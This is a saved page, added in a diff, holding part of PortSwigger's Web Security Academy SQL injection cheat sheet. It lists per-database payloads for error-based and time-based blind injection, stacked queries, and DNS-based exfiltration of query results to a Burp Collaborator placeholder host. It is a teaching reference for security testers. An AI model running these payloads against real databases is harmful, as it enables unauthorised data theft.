+                    SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'<br>
+                </code></td>
+            </tr>
+        </tbody></table><h2 id="conditional-errors">Conditional errors</h2><p>
+            You can test a single boolean condition and trigger a database error if the condition is true.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
+                </code></td>
+            </tr>
+        </tbody></table><h2 id="extracting-data-via-visible-error-messages">Extracting data via visible error messages</h2><p>
+            You can potentially elicit error messages that leak sensitive data returned by your malicious query.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    SELECT 'foo' WHERE 1 = (SELECT 'secret')<br>
+                    <br>
+                    &gt; Conversion failed when converting the varchar value 'secret' to data type int.
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT CAST((SELECT password FROM users LIMIT 1) AS int)<br>
+                    <br>
+                    &gt; invalid input syntax for integer: "secret"
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))<br>
+                    <br>
+                    &gt; XPATH syntax error: '\secret'
+                </code></td>
+            </tr>
+        </tbody></table><h2 id="batched-or-stacked-queries">Batched (or stacked) queries</h2><p>
+            You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    Does not support batched queries.
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    QUERY-1-HERE; QUERY-2-HERE<br>
+                    QUERY-1-HERE QUERY-2-HERE
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    QUERY-1-HERE; QUERY-2-HERE
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    QUERY-1-HERE; QUERY-2-HERE
+                </code></td>
+            </tr>
+        </tbody></table><div class="highlightedarea">
+            <h4>Note</h4>
+            <p>
+                With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.
+            </p>
+        </div><h2 id="time-delays">Time delays</h2><p>
+            You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    dbms_pipe.receive_message(('a'),10)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    WAITFOR DELAY '0:0:10'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT pg_sleep(10)
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT SLEEP(10)
+                </code></td>
+            </tr>
+        </tbody></table><h2 id="conditional-time-delays">Conditional time delays</h2><p>
+            You can test a single boolean condition and trigger a time delay if the condition is true.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td><code>
+                    SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
+                </code></td>
+            </tr>
+        </tbody></table><h2 id="dns-lookup">DNS lookup</h2><p>
+            You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td>
+                    <p>(<a href="https://portswigger.net/web-security/xxe">XXE</a>) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:</p>
+                    <code>SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual</code>
+                    <p>The following technique works on fully patched Oracle installations, but requires elevated privileges:</p>
+                    <code>SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')</code>
+                </td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td>
+                    <p>The following techniques work on Windows only:</p>
+                    <code>LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')</code><br>
+                    <code>SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
+                </td>
+            </tr>
+        </tbody></table><h2 id="dns-lookup-with-data-exfiltration">DNS lookup with data exfiltration</h2><p>
+            You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use <a href="https://portswigger.net/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a> to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.
+        </p><table class="is-nonresponsive-table">
+            <tbody><tr>
+                <th>
+                    Oracle
+                </th>
+                <td><code>
+                    SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"&gt; %remote;]&gt;'),'/l') FROM dual
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    Microsoft
+                </th>
+                <td><code>
+                    declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    PostgreSQL
+                </th>
+                <td><code>
+                    create OR replace function f() returns void as $$<br>
+                    declare c text;<br>
+                    declare p text;<br>
+                    begin<br>
+                    SELECT into p (SELECT YOUR-QUERY-HERE);<br>
+                    c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';<br>
+                    execute c;<br>
+                    END;<br>
+                    $$ language plpgsql security definer;<br>
+                    SELECT f();
+                </code></td>
+            </tr>
+            <tr>
+                <th>
+                    MySQL
+                </th>
+                <td>
+                    The following technique works on Windows only:<br>
+                    <code>SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'</code>
+                </td>
+            </tr>
+        </tbody></table>
+        
+    </div>
+
+
+    <script src="./SQL injection cheat sheet _ Web Security Academy_files/staticcms.js.download" nonce=""></script>
+    <script src="./SQL injection cheat sheet _ Web Security Academy_files/websecacademy.js.download" nonce=""></script>
+
+                    
+        <div class="sidebar-content">
+            
+<input class="hidden" id="trackerpopup" type="checkbox">
+<div class="widgetcontainer-box is-twobtns academy-account-status pin-to-bottom" id="AcademyAccountStatusWidget">
+        <div class="flex">
+            <label class="open-progress visible-when-collapsed" for="trackerpopup" id="open-progress">&nbsp;</label>
+            <label class="close-progress hidden-when-collapsed" for="trackerpopup" id="close-progress">&nbsp;</label>
+            <svg class="expand-arrow" height="10" viewBox="0 0 17 10" width="17" xmlns="http://www.w3.org/2000/svg">
+                <polyline fill="none" points="1.03 9.11 9.01 1.14 16.96 9.11" stroke="#fff" stroke-miterlimit="10"></polyline>
+            </svg>
+            <h4>Track your progress</h4>
+        </div>
+        <div class="button-lozenge-container">
+            <label>Vulnerability labs:</label>
+            <a class="button-lozenge" href="https://portswigger.net/web-security/all-labs">
+                <span>View all</span>
+            </a>
+        </div>
+
+<div class="progress-with-percent">
+    <svg class="progress-bar" height="25">
+        <rect x="0" y="20" class="percent" width="100%" height="5"></rect>
+        <rect x="0" y="20" width="3%" height="5" class="progression-bar"></rect>
+        <text x="0%" y="15">3%</text>
+    </svg>
+</div>        <hr>
+        <label>Level progress:</label>
+        <div class="flex">
+            
+
+<div class="apprentice-progress">
+    
+<div class="radial-with-total ">
+    <div class="radial-text-element">
+        <div class="radial-text-element__progress">3</div>
+        <div class="radial-text-element__total">of 58</div>
+    </div>
+    <svg class="radial-meter" height="75%" viewBox="0 0 70 70" width="75%">
+        <g transform="rotate(-90 35 35)">
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="Black" stroke-width="5" class="radial-meter__full-ring">
+            </circle>
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="White" stroke-width="5" stroke-dasharray="204.20335" stroke-dashoffset="193.6411077586207" class="radial-meter__percent-ring">
+            </circle>
+        </g>
+    </svg>
+</div>
+    <div class="text-small x-light-grey">Apprentice</div>
+</div>
+            
+
+<div class="practitioner-progress">
+    
+<div class="radial-with-total ">
+    <div class="radial-text-element">
+        <div class="radial-text-element__progress">5</div>
+        <div class="radial-text-element__total">of 168</div>
+    </div>
+    <svg class="radial-meter" height="75%" viewBox="0 0 70 70" width="75%">
+        <g transform="rotate(-90 35 35)">
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="Black" stroke-width="5" class="radial-meter__full-ring">
+            </circle>
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="White" stroke-width="5" stroke-dasharray="204.20335" stroke-dashoffset="198.1258693452381" class="radial-meter__percent-ring">
+            </circle>
+        </g>
+    </svg>
+</div>
+    <div class="text-small x-light-grey">Practitioner</div>
+</div>
+            
+
+<div class="expert-progress">
+    
+<div class="radial-with-total ">
+    <div class="radial-text-element">
+        <div class="radial-text-element__progress">0</div>
+        <div class="radial-text-element__total">of 37</div>
+    </div>
+    <svg class="radial-meter" height="75%" viewBox="0 0 70 70" width="75%">
+        <g transform="rotate(-90 35 35)">
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="Black" stroke-width="5" class="radial-meter__full-ring">
+            </circle>
+            <circle cx="35" cy="35" r="32.5" fill="none" stroke="White" stroke-width="5" stroke-dasharray="204.20335" stroke-dashoffset="204.20335" class="radial-meter__percent-ring">
+            </circle>
+        </g>
+    </svg>
+</div>
+    <div class="text-small x-light-grey">Expert</div>
+</div>
+        </div>
+        <hr>
+        <label>Your level:</label>
+        <div class="flex-columns">
+            <div class="flex">
+                <div class="margin-right-l lab-icon lab-level-display__newbie">
+                    
+<svg viewBox="0 0 57.45 57.45">
+    <text font-size="24" font-stretch="condensed" font-weight="bold" x="13.9" y="32.7">Ne</text>
+    <path d="M57.45,57.45H0V0H57.45ZM2,55.44H55.45V2H2Z"></path>
+    <rect height="6.26" width="2" x="6.87" y="7.54"></rect>
+    <rect height="2" width="26.08" x="15.68" y="42.06"></rect>
+    <rect height="2" width="12.49" x="22.48" y="46.81"></rect>
+</svg>
+                </div>
+                <div>
+                    <div class="lab-level-display__newbie">
+                        NEWBIE
+                    </div>
+                        <span class="x-light-grey small-lab-reminder">
+                            Solve 55 more labs to become an apprentice.
+                        </span>
+                </div>
+            </div>
+            <a class="hof-pointer lab-level-display__newbie chevron-after" href="https://portswigger.net/web-security/hall-of-fame">See where you rank on our Hall of Fame</a>
+        </div>
+</div>
+
+
+            <div class="sidebar-trial-advert">
+                <img alt="Try Burp Suite for Free" src="./SQL injection cheat sheet _ Web Security Academy_files/burp-suite-icon.svg">
+                <h4>Find SQL injection vulnerabilities using Burp Suite</h4>
+                <a class="button-white" href="https://portswigger.net/burp">Try for free</a>
+            </div>
+        </div>
+    
+                </main>
+            </div>
+        </div>
+        
+    <footer class="wrapper">
+        <div class="container">
+            <div>
+                <p>Burp Suite</p>
+                <a href="https://portswigger.net/burp/vulnerability-scanner">Web vulnerability scanner</a>
+                <a href="https://portswigger.net/burp">Burp Suite Editions</a>
+                <a href="https://portswigger.net/burp/releases">Release Notes</a>
+            </div>
+            <div>
+                <p>Vulnerabilities</p>
+                <a href="https://portswigger.net/web-security/cross-site-scripting">Cross-site scripting (XSS)</a>
+                <a href="https://portswigger.net/web-security/sql-injection">SQL injection</a>
+                <a href="https://portswigger.net/web-security/csrf">Cross-site request forgery</a>
+                <a href="https://portswigger.net/web-security/xxe">XML external entity injection</a>
+                <a href="https://portswigger.net/web-security/file-path-traversal">Directory traversal</a>
+                <a href="https://portswigger.net/web-security/ssrf">Server-side request forgery</a>
+            </div>
+            <div>
+                <p>Customers</p>
+                <a href="https://portswigger.net/organizations">Organizations</a>
+                <a href="https://portswigger.net/testers">Testers</a>
+                <a href="https://portswigger.net/developers">Developers</a>
+            </div>
+            <div>
+                <p>Company</p>
+                <a href="https://portswigger.net/about">About</a>
+                <a href="https://portswigger.net/careers">Careers</a>
+                <a href="https://portswigger.net/about/contact">Contact</a>
+                <a href="https://portswigger.net/legal">Legal</a>
+                <a href="https://portswigger.net/privacy">Privacy Notice</a>
+            </div>
+            <div>
+                <p>Insights</p>
+                <a href="https://portswigger.net/web-security">Web Security Academy</a>
+                <a href="https://portswigger.net/blog">Blog</a>
+                <a href="https://portswigger.net/research">Research</a>
+            </div>
+            <div>
+                <a href="https://portswigger.net/"><img src="./SQL injection cheat sheet _ Web Security Academy_files/portswigger-logo.svg" alt="PortSwigger Logo" class="footer-logo"></a>
+                <a class="button-outline-blue-small camelcase" href="https://twitter.com/Burp_Suite" rel="noreferrer"><span class="icon-twitter"></span>  Follow us</a>
+                <p class="grey">© 2024 PortSwigger Ltd.</p>
+            </div>
+        </div>
+    </footer>
+    <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet#top" class="back-to-top allow-for-pinned"><svg xmlns="http://www.w3.org/2000/svg" width="26" height="26" viewBox="0 0 26 26"><polygon points="4.07 14.7 5.03 15.78 12.48 9.13 19.94 15.78 20.9 14.7 12.48 7.2 4.07 14.7" fill="#f63"></polygon><path d="M13,0A13,13,0,1,0,26,13,13,13,0,0,0,13,0Zm0,24.56A11.56,11.56,0,1,1,24.56,13,11.58,11.58,0,0,1,13,24.56Z" fill="#f63"></path></svg></a>
+
+    
+<span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span><script type="text/javascript">
+    var _paq = _paq || [];
+    _paq.push(['setTrackingSource', 'jstc_tm']);
+    _paq.push(['enableLinkTracking']);
+    _paq.push(['setIpTracking', true]);
+    _paq.push(['setDomains', ['portswigger.net', 'undefined.web-security-academy.net/']]);
+    _paq.push(['setCustomDimensionValue', 1, '']);
+    _paq.push(['setCustomDimensionValue', 2, '']);
+    _paq.push(['setCustomDimensionValue', 3, '']);
+    _paq.push(['setCustomDimensionValue', 4, '']);
+    _paq.push(['setCustomDimensionValue', 5, '']);
+    var userId = 'A75D58E8E33146F35636337CDA2977DF' ? 'A75D58E8E33146F35636337CDA2977DF' : false;
+    if (userId) {
+    _paq.push(['setUserId', userId]);
+    }
+    _paq.push(['trackPageView']);
+    (function(p,i,w,ik) {
+        var g=ik.createElement('script'),s=ik.getElementsByTagName('script')[0];
+        _paq.push(['setTrackerUrl', p]);
+        _paq.push(['setSiteId', w]);
+        g.type='text/javascript';g.async=true;g.defer=true;g.src=i;s.parentNode.insertBefore(g,s);
+    })('https://ps.piwik.pro/ppms.php','https://ps.containers.piwik.pro/ppms.js','287552c2\u002D4917\u002D42e0\u002D8982\u002Dba994a2a73d7',document)
+</script>
+<script type="text/javascript">
+    (function(l,p){var e,t="PPHeatmapClickProxyEvent";l.addEventListener(t,function(e){p._paq.push(["trackEvent","Heatmap events","Click",function(e,t){function s(e){var t=e;return i.forEach(function(e){t=t.replace(new RegExp(e,"g")," ").trim()}),t}function a(e){for(var t,a=[],r=0,n=e[r];n&&n!==l&&n!==p&&"html"!==(t=n.tagName.toLowerCase());n=n.parentNode,r++){if(n.id){t="#".concat(n.id),a.push(t);break}if(1<Array.prototype.slice.call(n.parentNode.children).filter(function(e){return e.tagName.toLowerCase()===t}).length){var o=Array.prototype.slice.call(n.parentNode.children).indexOf(n)+1;0<o&&(t+=":nth-child(".concat(o,")"))}if("string"==typeof n.className&&n.className){var c=n.className.trim();i.length&&(c=s(c)),c=c.replace(/\s+/g,"."),t+=".".concat(c)}a.push(t)}return a.reverse().join(">")}var i=t.CSSClassesSeparators,r=[],n="";if(e.composedPath)n=a(e.composedPath());else{for(var o=e.target;null!==o.parentNode;)r.push(o),o=o.parentNode;r.push(p.document),n=a(r)}return n}(e,{CSSClassesSeparators:[/\|\|/]})])}),(e=l.createEvent("HTMLEvents")).initEvent(t,!0,!0),p.PPHeatmapClickEvent=e})(document,window);
+</script>
+<span id="PING_CONTENT_DLS_POPUP" style="display: none;"></span><div style="background-color: transparent; border: none; bottom: 15px; display: block; margin: 0px; opacity: 1; padding: 0px; position: fixed; right: 15px; z-index: 2147483646;"><template shadowrootmode="closed"><style>/*!
+ * 
+ *     MCAFEE RESTRICTED CONFIDENTIAL
+ *     Copyright (c) 2024 McAfee, LLC
+ *
+ *     The source code contained or described herein and all documents related
+ *     to the source code ("Material") are owned by McAfee or its
+ *     suppliers or licensors. Title to the Material remains with McAfee
+ *     or its suppliers and licensors. The Material contains trade
+ *     secrets and proprietary and confidential information of McAfee or its
+ *     suppliers and licensors. The Material is protected by worldwide copyright
+ *     and trade secret laws and treaty provisions. No part of the Material may
+ *     be used, copied, reproduced, modified, published, uploaded, posted,
+ *     transmitted, distributed, or disclosed in any way without McAfee's prior
+ *     express written permission.
+ *
+ *     No license under any patent, copyright, trade secret or other intellectual
+ *     property right is granted to or conferred upon you by disclosure or
+ *     delivery of the Materials, either expressly, by implication, inducement,
+ *     estoppel or otherwise. Any license under such intellectual property rights
+ *     must be expressed and approved by McAfee in writing.
+ *
+ */
+@import url(https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;1,300;1,400;1,500;1,600;1,700;1,800&family=Poppins:ital,wght@0,400;0,500;0,600;0,800;1,400;1,500;1,600;1,800&display=swap);
+*{border:0;box-sizing:border-box;font:inherit;font-family:"mcafeeOpenSans","Open Sans",Arial,Helvetica,sans-serif;font-size:100%;margin:0;padding:0;vertical-align:baseline;outline:none}article,aside,details,figcaption,figure,footer,header,hgroup,menu,nav,section{display:block}html,body{background-color:#f5f6fa;font-family:"Open Sans","mcafeeOpenSans",Arial,Helvetica,sans-serif;line-height:1;height:100%;width:100%}ol,ul{list-style:none}blockquote,q{quotes:none}blockquote:after,blockquote:before,q:after,q:before{content:"";content:none}table{border-collapse:collapse;border-spacing:0}b{font-weight:bold}img{display:block}.dls__container{align-items:center;display:flex;margin:0 auto;margin-top:50px;position:relative}.dls__popup__expanded{align-items:center;overflow:hidden;border-radius:100px;cursor:pointer;display:flex;left:0;padding:15px;position:absolute;height:95px;width:383px;background-color:#fff;transition:all .3s ease-in-out}.dls__popup__expanded .dls__icon{height:65px;width:73px}.content{margin-left:12px}.content .content__images{display:flex;align-items:center;width:250px}.content .content__images .seperator__line{margin-left:5px;margin-right:10px}.content .content__images #dls_close_icon{cursor:pointer;margin-left:auto;margin-right:0px}.content p{font-family:"Poppins",Arial,Helvetica,sans-serif;font-weight:"400";font-size:14px;line-height:20px;margin-top:8px;color:#4258ff;width:250px;cursor:pointer}.shield{overflow:hidden;box-shadow:0px 2px 4px 0px rgba(33,41,52,.12),0px -1px 2px 0px rgba(0,0,0,.08);align-items:center;border-radius:100px;bottom:0;display:flex;height:95px;justify-content:center;position:absolute;right:0;width:383px;transition:all .3s ease-in-out}.shield__circle{display:flex;justify-content:center;align-items:center;width:55px;height:55px;background-color:#c01818;transition:all .6s ease-in-out .2s;z-index:1;opacity:0}
+
+/*# sourceMappingURL=../sourceMap/chrome/css/download_scan_popup.css.map*/</style><div class="dls__container">
+  <div class="shield" style="background: transparent; opacity: 0.1; display: none;">
+    <div class="shield__circle" style="opacity: 1;">
+      <img src="chrome-extension://fheoggkfdfchfphceeifdbepaooicaho/images/download_scan/mcafee_logo_white.svg?secret=qrin9i" x-mcsrc="" id="dls_ballon_icon" x-mcsrcparsed="true">
+    </div>
+    <div class="dls__popup__expanded" style="opacity: 0;">
+      <img src="chrome-extension://fheoggkfdfchfphceeifdbepaooicaho/images/download_scan/download_scan_icon.svg?secret=qrin9i" x-mcsrc="" class="dls__icon" x-mcsrcparsed="true">
+      <div class="content">
+        <div class="content__images">
+          <img src="chrome-extension://fheoggkfdfchfphceeifdbepaooicaho/images/download_scan/mcafee_logo_red.svg?secret=qrin9i" x-mcsrc="" id="dls_mcafee_logo" x-mcsrcparsed="true">
+          <img src="chrome-extension://fheoggkfdfchfphceeifdbepaooicaho/images/download_scan/seperator_line.svg?secret=qrin9i" x-mcsrc="" class="seperator__line" x-mcsrcparsed="true">
+          <img src="chrome-extension://fheoggkfdfchfphceeifdbepaooicaho/images/download_scan/webadvisor.svg?secret=qrin9i" x-mcsrc="" x-mcsrcparsed="true">
+          <img src="chrome-extension://fheoggkfdfchfphceeifdbepaooicaho/images/download_scan/close-outline.svg?secret=qrin9i" x-mcsrc="" id="dls_close_icon" x-mcsrcparsed="true">
+        </div>
+        <p id="download_scan_popup_expanded_descriptions">Your download's being scanned. We'll let you know if there's an issue.</p>
+      </div>
+    </div>
+  </div>
+</div><style>/*!
+ * 
+ *     MCAFEE RESTRICTED CONFIDENTIAL
+ *     Copyright (c) 2024 McAfee, LLC
+ *
+ *     The source code contained or described herein and all documents related
+ *     to the source code ("Material") are owned by McAfee or its
+ *     suppliers or licensors. Title to the Material remains with McAfee
+ *     or its suppliers and licensors. The Material contains trade
+ *     secrets and proprietary and confidential information of McAfee or its
+ *     suppliers and licensors. The Material is protected by worldwide copyright
+ *     and trade secret laws and treaty provisions. No part of the Material may
+ *     be used, copied, reproduced, modified, published, uploaded, posted,
+ *     transmitted, distributed, or disclosed in any way without McAfee's prior
+ *     express written permission.
+ *
+ *     No license under any patent, copyright, trade secret or other intellectual
+ *     property right is granted to or conferred upon you by disclosure or
+ *     delivery of the Materials, either expressly, by implication, inducement,
+ *     estoppel or otherwise. Any license under such intellectual property rights
+ *     must be expressed and approved by McAfee in writing.
+ *
+ */
+.mc-interactive-balloon{position:absolute;right:-50px;bottom:8px;box-shadow:rgba(0,0,0,.12) 0px 0px 10px;height:40px;width:40px;background:#1671ee;border-radius:20px;display:flex;justify-content:center;align-items:center}
+
+/*# sourceMappingURL=../sourceMap/chrome/css/interactive_balloon.css.map*/</style></template></div></body></html>
